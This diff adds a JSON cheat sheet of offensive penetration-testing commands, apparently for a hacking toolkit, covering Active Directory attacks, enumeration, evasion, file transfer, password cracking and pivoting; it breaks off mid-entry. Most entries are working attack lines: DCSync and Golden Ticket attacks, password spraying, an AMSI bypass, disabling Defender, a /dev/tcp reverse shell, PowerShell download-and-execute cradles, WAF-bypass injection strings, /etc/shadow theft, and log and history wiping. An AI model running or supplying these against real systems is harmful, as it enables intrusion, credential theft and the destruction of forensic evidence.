@@ -1,0 +1,2082 @@
+[
+  {
+    "category": "Active Directory",
+    "techniques": [
+      {
+        "id": "ad_1",
+        "name": "BloodHound Collection (SharpHound)",
+        "purpose": "Map AD attack paths and relationships",
+        "when_to_use": "After getting domain user credentials",
+        "command": "./SharpHound.exe -c All --zipfilename bloodhound.zip",
+        "tags": [
+          "ad",
+          "bloodhound"
+        ]
+      },
+      {
+        "id": "ad_2",
+        "name": "BloodHound Python (Remote)",
+        "purpose": "Collect AD data without uploading to target",
+        "when_to_use": "When you have domain creds and network access",
+        "command": "bloodhound-python -u {USERNAME} -p {PASSWORD} -d {TARGET_DOMAIN} -dc {TARGET_IP} -c All",
+        "tags": [
+          "ad",
+          "bloodhound",
+          "python"
+        ]
+      },
+      {
+        "id": "ad_3",
+        "name": "Kerberoasting",
+        "purpose": "Request TGS tickets for offline cracking",
+        "when_to_use": "When you have any domain user account",
+        "command": "impacket-GetUserSPNs {TARGET_DOMAIN}/{USERNAME}:{PASSWORD} -dc-ip {TARGET_IP} -request -outputfile kerberoast.txt",
+        "tags": [
+          "ad",
+          "kerberoast",
+          "kerberos"
+        ]
+      },
+      {
+        "id": "ad_4",
+        "name": "ASREPRoasting",
+        "purpose": "Get hashes for users without pre-auth required",
+        "when_to_use": "When you have a user list but no passwords",
+        "command": "impacket-GetNPUsers {TARGET_DOMAIN}/ -usersfile users.txt -dc-ip {TARGET_IP} -format hashcat -outputfile asrep.txt",
+        "tags": [
+          "ad",
+          "asrep",
+          "kerberos"
+        ]
+      },
+      {
+        "id": "ad_5",
+        "name": "DCSync Attack",
+        "purpose": "Dump all domain hashes as if you were a DC",
+        "when_to_use": "When you have DCSync rights (Domain Admin or delegated)",
+        "command": "impacket-secretsdump {TARGET_DOMAIN}/{USERNAME}:{PASSWORD}@{TARGET_IP} -just-dc-ntlm",
+        "tags": [
+          "ad",
+          "dcsync",
+          "hashes"
+        ]
+      },
+      {
+        "id": "ad_6",
+        "name": "Pass-the-Ticket (Impacket)",
+        "purpose": "Use Kerberos ticket for lateral movement",
+        "when_to_use": "After extracting a TGT/TGS ticket",
+        "command": "export KRB5CCNAME=ticket.ccache && impacket-psexec -k -no-pass {TARGET_DOMAIN}/{USERNAME}@{TARGET_IP}",
+        "tags": [
+          "ad",
+          "ptt",
+          "kerberos"
+        ]
+      },
+      {
+        "id": "ad_7",
+        "name": "Enumerate AD Users (CME)",
+        "purpose": "List all domain users",
+        "when_to_use": "With valid domain credentials",
+        "command": "crackmapexec smb {TARGET_IP} -u {USERNAME} -p {PASSWORD} --users",
+        "tags": [
+          "ad",
+          "cme",
+          "enum"
+        ]
+      },
+      {
+        "id": "ad_8",
+        "name": "Find Domain Admins",
+        "purpose": "List members of Domain Admins group",
+        "when_to_use": "After getting domain user access",
+        "command": "crackmapexec smb {TARGET_IP} -u {USERNAME} -p {PASSWORD} --groups 'Domain Admins'",
+        "tags": [
+          "ad",
+          "cme",
+          "enum"
+        ]
+      },
+      {
+        "id": "ad_9",
+        "name": "Golden Ticket Attack",
+        "purpose": "Forge Kerberos TGT for any user (persistence)",
+        "when_to_use": "After obtaining KRBTGT hash",
+        "command": "impacket-ticketer -nthash {PASSWORD} -domain-sid S-1-5-21-XXXX -domain {TARGET_DOMAIN} Administrator && export KRB5CCNAME=Administrator.ccache",
+        "tags": [
+          "ad",
+          "golden",
+          "kerberos"
+        ]
+      },
+      {
+        "id": "ad_10",
+        "name": "ACL Abuse - GenericAll",
+        "purpose": "Exploit GenericAll permission to reset password",
+        "when_to_use": "When BloodHound shows GenericAll on a user",
+        "command": "net rpc password {USERNAME} 'NewP@ss123' -U {TARGET_DOMAIN}/{USERNAME}%{PASSWORD} -S {TARGET_IP}",
+        "tags": [
+          "ad",
+          "acl",
+          "abuse"
+        ]
+      },
+      {
+        "id": "ad_11",
+        "name": "LDAP Password Spray",
+        "purpose": "Spray password against all AD users",
+        "when_to_use": "When you have a user list and a candidate password",
+        "command": "crackmapexec ldap {TARGET_IP} -u users.txt -p '{PASSWORD}' --continue-on-success",
+        "tags": [
+          "ad",
+          "spray",
+          "ldap"
+        ]
+      }
+    ]
+  },
+  {
+    "category": "Enumeration",
+    "techniques": [
+      {
+        "id": "enum_1",
+        "name": "Full TCP Port Scan",
+        "purpose": "Discover all 65535 open TCP ports",
+        "when_to_use": "Initial scan \u2014 always run this",
+        "command": "nmap -p- --min-rate 5000 -sV -sC -oN nmap_full.txt {TARGET_IP}",
+        "tags": [
+          "nmap",
+          "enumeration"
+        ]
+      },
+      {
+        "id": "enum_2",
+        "name": "Quick Top-1000 Scan",
+        "purpose": "Fast initial port discovery",
+        "when_to_use": "Quick first look before full scan",
+        "command": "nmap -sV -sC --open -oN nmap_quick.txt {TARGET_IP}",
+        "tags": [
+          "nmap",
+          "enumeration"
+        ]
+      },
+      {
+        "id": "enum_3",
+        "name": "UDP Top-200 Scan",
+        "purpose": "Discover open UDP services (SNMP, DNS, TFTP)",
+        "when_to_use": "After TCP scan",
+        "command": "sudo nmap -sU --top-ports 200 --open {TARGET_IP}",
+        "tags": [
+          "nmap",
+          "udp"
+        ]
+      },
+      {
+        "id": "enum_4",
+        "name": "Nmap Vuln Scripts",
+        "purpose": "Run vulnerability detection scripts",
+        "when_to_use": "After identifying open services",
+        "command": "nmap --script vuln -p {TARGET_IP}",
+        "tags": [
+          "nmap",
+          "vuln"
+        ]
+      },
+      {
+        "id": "enum_5",
+        "name": "Web Directory Brute Force",
+        "purpose": "Find hidden directories and files",
+        "when_to_use": "When a web server is running",
+        "command": "gobuster dir -u http://{TARGET_IP} -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt -x php,html,txt,bak,zip -o gobuster.txt -t 50",
+        "tags": [
+          "web",
+          "gobuster"
+        ]
+      },
+      {
+        "id": "enum_6",
+        "name": "FFUF Vhost Fuzzing",
+        "purpose": "Discover virtual hosts on same IP",
+        "when_to_use": "When target uses name-based vhosting",
+        "command": "ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://{TARGET_IP} -H 'Host: FUZZ.{TARGET_DOMAIN}' -fs 0",
+        "tags": [
+          "web",
+          "ffuf",
+          "vhost"
+        ]
+      },
+      {
+        "id": "enum_7",
+        "name": "Nikto Web Scan",
+        "purpose": "Detect web vulnerabilities and misconfigs",
+        "when_to_use": "Web server enumeration",
+        "command": "nikto -h http://{TARGET_IP} -o nikto.txt",
+        "tags": [
+          "web",
+          "nikto"
+        ]
+      },
+      {
+        "id": "enum_8",
+        "name": "SNMP Enumeration (v2c)",
+        "purpose": "Extract system info, users, processes via SNMP",
+        "when_to_use": "When UDP 161 is open",
+        "command": "snmpwalk -v2c -c public {TARGET_IP} 1.3.6.1.2.1",
+        "tags": [
+          "snmp",
+          "enumeration"
+        ]
+      },
+      {
+        "id": "enum_9",
+        "name": "SNMP Brute Force Community",
+        "purpose": "Find valid SNMP community strings",
+        "when_to_use": "When SNMP is open but public fails",
+        "command": "onesixtyone -c /usr/share/seclists/Discovery/SNMP/snmp.txt {TARGET_IP}",
+        "tags": [
+          "snmp",
+          "brute"
+        ]
+      },
+      {
+        "id": "enum_10",
+        "name": "LDAP Enumeration (anonymous)",
+        "purpose": "Dump AD users and objects without creds",
+        "when_to_use": "When LDAP (389) is open on a DC",
+        "command": "ldapsearch -x -H ldap://{TARGET_IP} -b 'DC=domain,DC=local' -s sub '(objectClass=person)' sAMAccountName",
+        "tags": [
+          "ldap",
+          "ad"
+        ]
+      },
+      {
+        "id": "enum_11",
+        "name": "RPC User Enumeration",
+        "purpose": "Enumerate domain users via RPC",
+        "when_to_use": "When port 135/445 is open",
+        "command": "rpcclient -U '' -N {TARGET_IP} -c 'enumdomusers;enumdomgroups'",
+        "tags": [
+          "rpc",
+          "smb"
+        ]
+      },
+      {
+        "id": "enum_12",
+        "name": "FTP Anonymous Login",
+        "purpose": "Check for anonymous FTP access",
+        "when_to_use": "When FTP (21) is open",
+        "command": "ftp {TARGET_IP}",
+        "tags": [
+          "ftp",
+          "enumeration"
+        ]
+      },
+      {
+        "id": "enum_13",
+        "name": "WinRM Check",
+        "purpose": "Check if WinRM is accessible",
+        "when_to_use": "When port 5985/5986 is open",
+        "command": "crackmapexec winrm {TARGET_IP} -u {USERNAME} -p {PASSWORD}",
+        "tags": [
+          "winrm",
+          "enum"
+        ]
+      },
+      {
+        "id": "enum_14",
+        "name": "MSSQL Enumeration",
+        "purpose": "Enumerate MSSQL server",
+        "when_to_use": "When port 1433 is open",
+        "command": "nmap -p 1433 --script ms-sql-info,ms-sql-empty-password,ms-sql-config {TARGET_IP}",
+        "tags": [
+          "mssql",
+          "enum"
+        ]
+      },
+      {
+        "id": "enum_15",
+        "name": "MySQL Enumeration",
+        "purpose": "Enumerate MySQL server",
+        "when_to_use": "When port 3306 is open",
+        "command": "nmap -p 3306 --script mysql-info,mysql-empty-password,mysql-databases {TARGET_IP}",
+        "tags": [
+          "mysql",
+          "enum"
+        ]
+      }
+    ]
+  },
+  {
+    "category": "Evasion Techniques",
+    "techniques": [
+      {
+        "id": "ev_1",
+        "name": "Command Injection - Slash Bypass (c/at)",
+        "purpose": "Bypass blacklist filtering specific command names",
+        "when_to_use": "When 'cat' is blacklisted by WAF or filter",
+        "command": "c'a't /etc/passwd\nc\"a\"t /etc/passwd\nca$()t /etc/passwd\n/bin/c?t /etc/passwd",
+        "tags": [
+          "evasion",
+          "cmdi",
+          "bypass"
+        ]
+      },
+      {
+        "id": "ev_2",
+        "name": "Command Injection - Space Bypass",
+        "purpose": "Bypass space character filtering",
+        "when_to_use": "When spaces are filtered in command injection",
+        "command": "cat${IFS}/etc/passwd\ncat$IFS/etc/passwd\ncat</etc/passwd\n{cat,/etc/passwd}",
+        "tags": [
+          "evasion",
+          "cmdi",
+          "bypass"
+        ]
+      },
+      {
+        "id": "ev_3",
+        "name": "Command Injection - Semicolon/Newline Bypass",
+        "purpose": "Bypass && and || operator filters",
+        "when_to_use": "When && and | are filtered",
+        "command": "127.0.0.1%0aid\n127.0.0.1%0a%0aid\n127.0.0.1;id\n127.0.0.1%3bid",
+        "tags": [
+          "evasion",
+          "cmdi",
+          "bypass"
+        ]
+      },
+      {
+        "id": "ev_4",
+        "name": "Command Injection - Backtick/Subshell",
+        "purpose": "Execute commands inside other commands",
+        "when_to_use": "When semicolons are filtered",
+        "command": "127.0.0.1`id`\n127.0.0.1$(id)\n127.0.0.1$((id))",
+        "tags": [
+          "evasion",
+          "cmdi",
+          "bypass"
+        ]
+      },
+      {
+        "id": "ev_5",
+        "name": "PowerShell - Execution Policy Bypass",
+        "purpose": "Run PowerShell scripts when policy blocks them",
+        "when_to_use": "When PowerShell execution policy is Restricted",
+        "command": "powershell -ExecutionPolicy Bypass -File script.ps1\npowershell -ep bypass -c \"IEX(...)\"",
+        "tags": [
+          "evasion",
+          "powershell",
+          "windows"
+        ]
+      },
+      {
+        "id": "ev_6",
+        "name": "PowerShell - AMSI Bypass (Memory Patch)",
+        "purpose": "Disable AMSI to run malicious scripts",
+        "when_to_use": "When AMSI is blocking PowerShell payloads",
+        "command": "[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)",
+        "tags": [
+          "evasion",
+          "amsi",
+          "powershell"
+        ]
+      },
+      {
+        "id": "ev_7",
+        "name": "PowerShell - Base64 Encoded Command",
+        "purpose": "Obfuscate PowerShell commands",
+        "when_to_use": "When plain PowerShell is detected/blocked",
+        "command": "$cmd = 'IEX(New-Object Net.WebClient).DownloadString(\"http://{TARGET_IP}:8080/shell.ps1\")'\n$enc = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($cmd))\npowershell -enc $enc",
+        "tags": [
+          "evasion",
+          "powershell",
+          "obfuscation"
+        ]
+      },
+      {
+        "id": "ev_8",
+        "name": "Windows Defender Exclusion",
+        "purpose": "Add path to Defender exclusion list",
+        "when_to_use": "After gaining admin \u2014 before dropping payloads",
+        "command": "Add-MpPreference -ExclusionPath 'C:\\Windows\\Temp'\nAdd-MpPreference -ExclusionExtension '.exe'",
+        "tags": [
+          "evasion",
+          "defender",
+          "windows"
+        ]
+      },
+      {
+        "id": "ev_9",
+        "name": "Disable Windows Defender",
+        "purpose": "Completely disable Windows Defender",
+        "when_to_use": "After gaining admin access on Windows",
+        "command": "Set-MpPreference -DisableRealtimeMonitoring $true\nnet stop WinDefend",
+        "tags": [
+          "evasion",
+          "defender",
+          "windows"
+        ]
+      },
+      {
+        "id": "ev_10",
+        "name": "msfvenom Encoded Payload",
+        "purpose": "Encode payload to evade AV signatures",
+        "when_to_use": "When plain msfvenom payloads are detected",
+        "command": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={TARGET_IP} LPORT=4444 -e x64/xor_dynamic -i 5 -f exe -o shell_enc.exe",
+        "tags": [
+          "evasion",
+          "msfvenom",
+          "av"
+        ]
+      },
+      {
+        "id": "ev_11",
+        "name": "Living off the Land - Regsvr32",
+        "purpose": "Execute payload using trusted Windows binary",
+        "when_to_use": "When .exe execution is blocked",
+        "command": "regsvr32 /s /n /u /i:http://{TARGET_IP}:8080/payload.sct scrobj.dll",
+        "tags": [
+          "evasion",
+          "lolbas",
+          "windows"
+        ]
+      },
+      {
+        "id": "ev_12",
+        "name": "Living off the Land - Mshta",
+        "purpose": "Execute HTA payload via trusted binary",
+        "when_to_use": "When .exe is blocked but mshta is available",
+        "command": "mshta http://{TARGET_IP}:8080/payload.hta",
+        "tags": [
+          "evasion",
+          "lolbas",
+          "windows"
+        ]
+      },
+      {
+        "id": "ev_13",
+        "name": "Living off the Land - Certutil Decode",
+        "purpose": "Decode and execute payload via certutil",
+        "when_to_use": "When direct execution is blocked",
+        "command": "certutil -decode encoded_payload.txt shell.exe && shell.exe",
+        "tags": [
+          "evasion",
+          "lolbas",
+          "certutil"
+        ]
+      },
+      {
+        "id": "ev_14",
+        "name": "Linux - Obfuscate Command with Variables",
+        "purpose": "Bypass string-based command filters",
+        "when_to_use": "When specific command strings are blacklisted",
+        "command": "a=c;b=at;$a$b /etc/passwd\nwho$@ami\nwho$()ami",
+        "tags": [
+          "evasion",
+          "linux",
+          "bypass"
+        ]
+      },
+      {
+        "id": "ev_15",
+        "name": "Linux - Reverse Shell via /dev/tcp (No nc)",
+        "purpose": "Get reverse shell without netcat",
+        "when_to_use": "When netcat is not available on target",
+        "command": "bash -i >& /dev/tcp/{TARGET_IP}/4444 0>&1\nexec 5<>/dev/tcp/{TARGET_IP}/4444; cat <&5 | while read line; do $line 2>&5 >&5; done",
+        "tags": [
+          "evasion",
+          "shell",
+          "linux"
+        ]
+      },
+      {
+        "id": "ev_16",
+        "name": "WAF Bypass - URL Encoding",
+        "purpose": "Bypass WAF by encoding special characters",
+        "when_to_use": "When WAF blocks special characters in URL",
+        "command": "curl 'http://{TARGET_IP}/page?id=1%27%20OR%201%3D1--'\ncurl 'http://{TARGET_IP}/page?cmd=id%0a'",
+        "tags": [
+          "evasion",
+          "waf",
+          "web"
+        ]
+      },
+      {
+        "id": "ev_17",
+        "name": "WAF Bypass - Case Variation (SQLi)",
+        "purpose": "Bypass case-sensitive WAF rules",
+        "when_to_use": "When WAF blocks lowercase SQL keywords",
+        "command": "' Or 1=1--\n' oR '1'='1\n' UNION SeLeCt null,null--",
+        "tags": [
+          "evasion",
+          "waf",
+          "sqli"
+        ]
+      },
+      {
+        "id": "ev_18",
+        "name": "WAF Bypass - Comment Injection (SQLi)",
+        "purpose": "Break up SQL keywords with comments",
+        "when_to_use": "When WAF detects SQL keywords",
+        "command": "' UN/**/ION SE/**/LECT null,null--\n' /*!UNION*/ /*!SELECT*/ null,null--",
+        "tags": [
+          "evasion",
+          "waf",
+          "sqli"
+        ]
+      },
+      {
+        "id": "ev_19",
+        "name": "Process Injection via PowerShell",
+        "purpose": "Inject shellcode into legitimate process",
+        "when_to_use": "When AV monitors new process creation",
+        "command": "$pid = (Get-Process explorer).Id\n# Use Invoke-Shellcode or similar to inject into PID",
+        "tags": [
+          "evasion",
+          "injection",
+          "powershell"
+        ]
+      },
+      {
+        "id": "ev_20",
+        "name": "Timestomp - Modify File Timestamps",
+        "purpose": "Hide file creation time to avoid forensics",
+        "when_to_use": "After dropping files on target",
+        "command": "touch -t 202001010000 /tmp/shell.sh\n# Windows: (Get-Item shell.exe).LastWriteTime = '01/01/2020 00:00:00'",
+        "tags": [
+          "evasion",
+          "forensics",
+          "stealth"
+        ]
+      },
+      {
+        "id": "ev_21",
+        "name": "Clear Bash History",
+        "purpose": "Remove command history to cover tracks",
+        "when_to_use": "Before leaving a compromised Linux host",
+        "command": "history -c && history -w\nunset HISTFILE\nexport HISTSIZE=0\nrm -f ~/.bash_history",
+        "tags": [
+          "evasion",
+          "stealth",
+          "linux"
+        ]
+      },
+      {
+        "id": "ev_22",
+        "name": "Clear Windows Event Logs",
+        "purpose": "Remove evidence from Windows event logs",
+        "when_to_use": "Before leaving a compromised Windows host",
+        "command": "wevtutil cl System && wevtutil cl Security && wevtutil cl Application\nGet-EventLog -List | ForEach-Object { Clear-EventLog $_.Log }",
+        "tags": [
+          "evasion",
+          "stealth",
+          "windows"
+        ]
+      }
+    ]
+  },
+  {
+    "category": "File Transfer",
+    "techniques": [
+      {
+        "id": "ft_1",
+        "name": "Python HTTP Server",
+        "purpose": "Serve files from attacker machine",
+        "when_to_use": "When transferring files to target",
+        "command": "python3 -m http.server 8080",
+        "tags": [
+          "transfer",
+          "python",
+          "http"
+        ]
+      },
+      {
+        "id": "ft_2",
+        "name": "wget Download",
+        "purpose": "Download file from HTTP server",
+        "when_to_use": "On Linux target",
+        "command": "wget http://{TARGET_IP}:8080/file.sh -O /tmp/file.sh && chmod +x /tmp/file.sh",
+        "tags": [
+          "transfer",
+          "wget",
+          "linux"
+        ]
+      },
+      {
+        "id": "ft_3",
+        "name": "curl Download",
+        "purpose": "Download file silently",
+        "when_to_use": "On Linux target",
+        "command": "curl -s http://{TARGET_IP}:8080/file.sh -o /tmp/file.sh && chmod +x /tmp/file.sh",
+        "tags": [
+          "transfer",
+          "curl",
+          "linux"
+        ]
+      },
+      {
+        "id": "ft_4",
+        "name": "SCP Upload to Target",
+        "purpose": "Upload file to remote host via SSH",
+        "when_to_use": "When SSH is available",
+        "command": "scp /local/file.txt {USERNAME}@{TARGET_IP}:/tmp/file.txt",
+        "tags": [
+          "transfer",
+          "scp",
+          "ssh"
+        ]
+      },
+      {
+        "id": "ft_5",
+        "name": "SCP Download from Target",
+        "purpose": "Download file from remote host",
+        "when_to_use": "When exfiltrating files",
+        "command": "scp {USERNAME}@{TARGET_IP}:/etc/shadow /tmp/shadow",
+        "tags": [
+          "transfer",
+          "scp",
+          "ssh"
+        ]
+      },
+      {
+        "id": "ft_6",
+        "name": "SCP Recursive Directory",
+        "purpose": "Transfer entire directory",
+        "when_to_use": "When transferring multiple files",
+        "command": "scp -r {USERNAME}@{TARGET_IP}:/var/www/html /tmp/webroot",
+        "tags": [
+          "transfer",
+          "scp",
+          "ssh"
+        ]
+      },
+      {
+        "id": "ft_7",
+        "name": "PowerShell WebClient Download",
+        "purpose": "Download file on Windows",
+        "when_to_use": "On Windows target",
+        "command": "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://{TARGET_IP}:8080/file.exe','C:\\Windows\\Temp\\file.exe')\"",
+        "tags": [
+          "transfer",
+          "powershell",
+          "windows"
+        ]
+      },
+      {
+        "id": "ft_8",
+        "name": "PowerShell IEX (Fileless)",
+        "purpose": "Execute script in memory without writing to disk",
+        "when_to_use": "When AV is blocking file writes",
+        "command": "powershell -nop -exec bypass -c \"IEX(New-Object Net.WebClient).DownloadString('http://{TARGET_IP}:8080/script.ps1')\"",
+        "tags": [
+          "transfer",
+          "powershell",
+          "fileless"
+        ]
+      },
+      {
+        "id": "ft_9",
+        "name": "Certutil Download (Windows)",
+        "purpose": "Download file using certutil",
+        "when_to_use": "When PowerShell is restricted",
+        "command": "certutil -urlcache -split -f http://{TARGET_IP}:8080/file.exe C:\\Windows\\Temp\\file.exe",
+        "tags": [
+          "transfer",
+          "certutil",
+          "windows"
+        ]
+      },
+      {
+        "id": "ft_10",
+        "name": "Impacket SMB Server",
+        "purpose": "Host files over SMB for Windows targets",
+        "when_to_use": "When transferring to Windows without HTTP",
+        "command": "impacket-smbserver share . -smb2support -username {USERNAME} -password {PASSWORD}",
+        "tags": [
+          "transfer",
+          "smb",
+          "windows"
+        ]
+      },
+      {
+        "id": "ft_11",
+        "name": "Base64 Encode Transfer",
+        "purpose": "Transfer files through shell as base64 text",
+        "when_to_use": "When no HTTP/SMB/SCP available",
+        "command": "base64 -w 0 /tmp/file.sh && echo 'PASTE_BASE64_HERE' | base64 -d > /tmp/file.sh",
+        "tags": [
+          "transfer",
+          "base64"
+        ]
+      },
+      {
+        "id": "ft_12",
+        "name": "Netcat File Transfer",
+        "purpose": "Transfer file using netcat",
+        "when_to_use": "When only netcat is available",
+        "command": "nc -lvnp 4444 > received_file  # receiver\nnc {TARGET_IP} 4444 < file_to_send  # sender",
+        "tags": [
+          "transfer",
+          "netcat"
+        ]
+      },
+      {
+        "id": "ft_13",
+        "name": "SFTP Interactive Transfer",
+        "purpose": "Browse and transfer files interactively",
+        "when_to_use": "When SSH is available and you need to navigate",
+        "command": "sftp {USERNAME}@{TARGET_IP}",
+        "tags": [
+          "transfer",
+          "sftp",
+          "ssh"
+        ]
+      },
+      {
+        "id": "ft_14",
+        "name": "Wget via Proxy",
+        "purpose": "Download through a proxy",
+        "when_to_use": "When direct connection is blocked",
+        "command": "wget -e use_proxy=yes -e http_proxy=127.0.0.1:8080 http://{TARGET_IP}:8080/file.sh -O /tmp/file.sh",
+        "tags": [
+          "transfer",
+          "wget",
+          "proxy"
+        ]
+      }
+    ]
+  },
+  {
+    "category": "Password Attacks",
+    "techniques": [
+      {
+        "id": "pass_1",
+        "name": "Hydra SSH Brute Force",
+        "purpose": "Brute force SSH login",
+        "when_to_use": "When SSH is open and you have a username",
+        "command": "hydra -l {USERNAME} -P /usr/share/wordlists/rockyou.txt ssh://{TARGET_IP} -t 4 -V",
+        "tags": [
+          "hydra",
+          "ssh",
+          "brute"
+        ]
+      },
+      {
+        "id": "pass_2",
+        "name": "Hydra RDP Brute Force",
+        "purpose": "Brute force RDP credentials",
+        "when_to_use": "When RDP (3389) is open",
+        "command": "hydra -L users.txt -P /usr/share/wordlists/rockyou.txt rdp://{TARGET_IP} -t 1 -W 3",
+        "tags": [
+          "hydra",
+          "rdp",
+          "brute"
+        ]
+      },
+      {
+        "id": "pass_3",
+        "name": "Hydra HTTP POST Brute Force",
+        "purpose": "Brute force web login form",
+        "when_to_use": "When a login form exists",
+        "command": "hydra -l {USERNAME} -P /usr/share/wordlists/rockyou.txt {TARGET_IP} http-post-form '/login:user=^USER^&pass=^PASS^:Invalid credentials'",
+        "tags": [
+          "hydra",
+          "web",
+          "brute"
+        ]
+      },
+      {
+        "id": "pass_4",
+        "name": "Hydra FTP Brute Force",
+        "purpose": "Brute force FTP credentials",
+        "when_to_use": "When FTP (21) is open",
+        "command": "hydra -l {USERNAME} -P /usr/share/wordlists/rockyou.txt ftp://{TARGET_IP}",
+        "tags": [
+          "hydra",
+          "ftp",
+          "brute"
+        ]
+      },
+      {
+        "id": "pass_5",
+        "name": "Hashcat NTLM Crack",
+        "purpose": "Crack NTLM hash offline",
+        "when_to_use": "After dumping NTLM hashes",
+        "command": "hashcat -m 1000 -a 0 hash.txt /usr/share/wordlists/rockyou.txt --force",
+        "tags": [
+          "hashcat",
+          "ntlm",
+          "crack"
+        ]
+      },
+      {
+        "id": "pass_6",
+        "name": "Hashcat NetNTLMv2 Crack",
+        "purpose": "Crack captured NetNTLMv2 hashes",
+        "when_to_use": "After capturing with Responder",
+        "command": "hashcat -m 5600 -a 0 netntlm.txt /usr/share/wordlists/rockyou.txt --force",
+        "tags": [
+          "hashcat",
+          "ntlm",
+          "crack"
+        ]
+      },
+      {
+        "id": "pass_7",
+        "name": "Hashcat Kerberoast TGS Crack",
+        "purpose": "Crack Kerberos TGS tickets",
+        "when_to_use": "After Kerberoasting",
+        "command": "hashcat -m 13100 -a 0 kerberoast.txt /usr/share/wordlists/rockyou.txt --force",
+        "tags": [
+          "hashcat",
+          "kerberos",
+          "crack"
+        ]
+      },
+      {
+        "id": "pass_8",
+        "name": "Hashcat MD5 Crack",
+        "purpose": "Crack MD5 hash",
+        "when_to_use": "When you have an MD5 hash",
+        "command": "hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt",
+        "tags": [
+          "hashcat",
+          "md5",
+          "crack"
+        ]
+      },
+      {
+        "id": "pass_9",
+        "name": "John the Ripper Auto",
+        "purpose": "Auto-detect hash type and crack",
+        "when_to_use": "Quick hash cracking",
+        "command": "john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt && john --show hash.txt",
+        "tags": [
+          "john",
+          "crack"
+        ]
+      },
+      {
+        "id": "pass_10",
+        "name": "John SSH Key Crack",
+        "purpose": "Crack passphrase-protected SSH key",
+        "when_to_use": "When you have an encrypted id_rsa",
+        "command": "ssh2john id_rsa > id_rsa.hash && john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash",
+        "tags": [
+          "john",
+          "ssh",
+          "crack"
+        ]
+      },
+      {
+        "id": "pass_11",
+        "name": "CrackMapExec Password Spray",
+        "purpose": "Spray one password across many users",
+        "when_to_use": "When you have a user list and one password",
+        "command": "crackmapexec smb {TARGET_IP} -u users.txt -p '{PASSWORD}' --continue-on-success",
+        "tags": [
+          "cme",
+          "spray",
+          "smb"
+        ]
+      },
+      {
+        "id": "pass_12",
+        "name": "Kerbrute User Enumeration",
+        "purpose": "Enumerate valid AD usernames via Kerberos",
+        "when_to_use": "When targeting AD without credentials",
+        "command": "kerbrute userenum -d {TARGET_DOMAIN} --dc {TARGET_IP} /usr/share/seclists/Usernames/xato-net-10-million-usernames.txt",
+        "tags": [
+          "kerbrute",
+          "ad",
+          "enum"
+        ]
+      },
+      {
+        "id": "pass_13",
+        "name": "Responder NTLM Capture",
+        "purpose": "Capture NetNTLMv2 hashes on the network",
+        "when_to_use": "When on same network segment as target",
+        "command": "sudo responder -I eth0 -wrf",
+        "tags": [
+          "responder",
+          "ntlm",
+          "capture"
+        ]
+      },
+      {
+        "id": "pass_14",
+        "name": "Unshadow + John (Linux)",
+        "purpose": "Crack Linux /etc/shadow passwords",
+        "when_to_use": "After reading /etc/passwd and /etc/shadow",
+        "command": "unshadow /etc/passwd /etc/shadow > unshadowed.txt && john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt",
+        "tags": [
+          "john",
+          "linux",
+          "crack"
+        ]
+      }
+    ]
+  },
+  {
+    "category": "Pivoting",
+    "techniques": [
+      {
+        "id": "piv_1",
+        "name": "Chisel Server (Attacker)",
+        "purpose": "Set up reverse SOCKS5 proxy server",
+        "when_to_use": "When pivoting into internal network",
+        "command": "./chisel server -p 8001 --reverse --socks5",
+        "tags": [
+          "pivot",
+          "chisel",
+          "socks"
+        ]
+      },
+      {
+        "id": "piv_2",
+        "name": "Chisel Client (Target)",
+        "purpose": "Connect back to chisel server for SOCKS5",
+        "when_to_use": "Run on compromised host",
+        "command": "./chisel client {TARGET_IP}:8001 R:socks",
+        "tags": [
+          "pivot",
+          "chisel",
+          "socks"
+        ]
+      },
+      {
+        "id": "piv_3",
+        "name": "Chisel Local Port Forward",
+        "purpose": "Forward specific port through chisel",
+        "when_to_use": "When you need one specific port forwarded",
+        "command": "./chisel client {TARGET_IP}:8001 R:3306:127.0.0.1:3306",
+        "tags": [
+          "pivot",
+          "chisel",
+          "portfwd"
+        ]
+      },
+      {
+        "id": "piv_4",
+        "name": "SSH SOCKS Proxy",
+        "purpose": "Create SOCKS5 proxy via SSH",
+        "when_to_use": "When you have SSH access to pivot host",
+        "command": "ssh -D 1080 -f -N {USERNAME}@{PIVOT_IP} && echo 'socks5 127.0.0.1 1080' >> /etc/proxychains4.conf",
+        "tags": [
+          "pivot",
+          "ssh",
+          "socks"
+        ]
+      },
+      {
+        "id": "piv_5",
+        "name": "SSH Local Port Forward",
+        "purpose": "Forward remote internal port to localhost",
+        "when_to_use": "To reach internal service via SSH pivot",
+        "command": "ssh -L 8080:{TARGET_IP}:80 {USERNAME}@{PIVOT_IP} -N -f",
+        "tags": [
+          "pivot",
+          "ssh",
+          "portfwd"
+        ]
+      },
+      {
+        "id": "piv_6",
+        "name": "Proxychains with Nmap",
+        "purpose": "Scan internal network through SOCKS proxy",
+        "when_to_use": "After setting up SOCKS proxy",
+        "command": "proxychains nmap -sT -Pn -p 22,80,443,445,3389 {PIVOT_IP}",
+        "tags": [
+          "pivot",
+          "proxychains",
+          "nmap"
+        ]
+      },
+      {
+        "id": "piv_7",
+        "name": "Ligolo-ng Proxy (Attacker)",
+        "purpose": "Fast TUN-based tunneling",
+        "when_to_use": "Advanced pivoting \u2014 faster than chisel",
+        "command": "./proxy -selfcert -laddr 0.0.0.0:11601",
+        "tags": [
+          "pivot",
+          "ligolo"
+        ]
+      },
+      {
+        "id": "piv_8",
+        "name": "Ligolo-ng Agent (Target)",
+        "purpose": "Connect agent to ligolo proxy",
+        "when_to_use": "Run on compromised host",
+        "command": "./agent -connect {TARGET_IP}:11601 -ignore-cert",
+        "tags": [
+          "pivot",
+          "ligolo"
+        ]
+      },
+      {
+        "id": "piv_9",
+        "name": "Socat Port Forward",
+        "purpose": "Forward port from pivot to internal host",
+        "when_to_use": "Simple port forwarding without SSH",
+        "command": "socat TCP-LISTEN:8080,fork TCP:{PIVOT_IP}:80 &",
+        "tags": [
+          "pivot",
+          "socat"
+        ]
+      },
+      {
+        "id": "piv_10",
